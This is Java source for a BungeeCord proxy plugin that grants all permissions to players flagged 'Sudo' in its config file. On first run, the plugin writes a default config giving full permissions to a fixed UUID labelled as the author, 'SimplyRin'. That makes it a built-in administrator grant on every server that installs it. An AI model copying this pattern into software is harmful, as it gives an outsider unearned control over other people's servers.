package net.simplyrin.bungeesudo;

import java.io.File;

import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.event.PermissionCheckEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.api.plugin.Plugin;
import net.md_5.bungee.config.Configuration;
import net.md_5.bungee.event.EventHandler;
import net.simplyrin.bungeesudo.utils.Config;

/**
 * Created by SimplyRin on 2018/11/20.
 *
 * Copyright (c) 2018 SimplyRin
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
public class Main extends Plugin implements Listener {

	private Configuration config;

	@Override
	public void onEnable() {
		File folder = this.getDataFolder();
		if (!folder.exists()) {
			folder.mkdirs();
		}

		File file = new File(folder, "config.yml");
		if (!file.exists()) {
			try {
				file.createNewFile();
			} catch (Exception e) {
			}

			Configuration config = Config.getConfig(file);

			config.set("Player.b0bb65a2-832f-4a5d-854e-873b7c4522ed.Sudo", true);
			config.set("Player.b0bb65a2-832f-4a5d-854e-873b7c4522ed.Name", "SimplyRin");

			Config.saveConfig(config, file);
		}

		this.config = Config.getConfig(file);

		this.getProxy().getPluginManager().registerListener(this, this);
	}

	@EventHandler
	public void onPermissionCheck(PermissionCheckEvent event) {
		if (!(event.getSender() instanceof ProxiedPlayer)) {
			return;
		}

		ProxiedPlayer player = (ProxiedPlayer) event.getSender();

		if (this.config.getBoolean("Player." + player.getUniqueId().toString() + ".Sudo")) {
			event.setHasPermission(true);
		}
	}

}
